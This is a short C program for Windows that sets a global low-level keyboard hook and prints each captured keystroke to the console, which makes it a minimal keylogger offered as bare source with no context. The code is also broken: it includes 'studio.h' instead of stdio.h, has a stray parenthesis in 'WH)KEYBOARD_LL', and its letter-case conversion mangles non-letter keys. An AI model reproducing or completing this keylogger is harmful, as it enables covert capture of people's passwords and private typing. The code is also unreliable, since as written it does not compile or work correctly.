#include <studio.h>
#include <Windows.h>

HHOOK hook;

LRESULT CALLBACK funcHook(int code, WPARAM wParam, LPARAM lParam);

int main() {
    MSG msg;
    hook = SetWindowsHookExA(WH)KEYBOARD_LL, funcHook, NULL, 0);

    if (hook == NULL) {
        printf("Erro on Hook\n");
        return(1);
    }

    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK funcHook(int code, WPARAM wParam, LPARAM lParam) {
    char ch;
    PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
    if (wParam == WM_KEYDOWN && code == HC_ACTION) {
        if (!GetAsyncKeyState(VK_SHIFT)) {
            ch = kbDllHook->vkCode + 32;
        } else {
            ch = kbDllHook->vkCode;
        }
        printf("%c", ch);
    }
    return(CallNextHookEx(hook, code, wParam, lParam));
}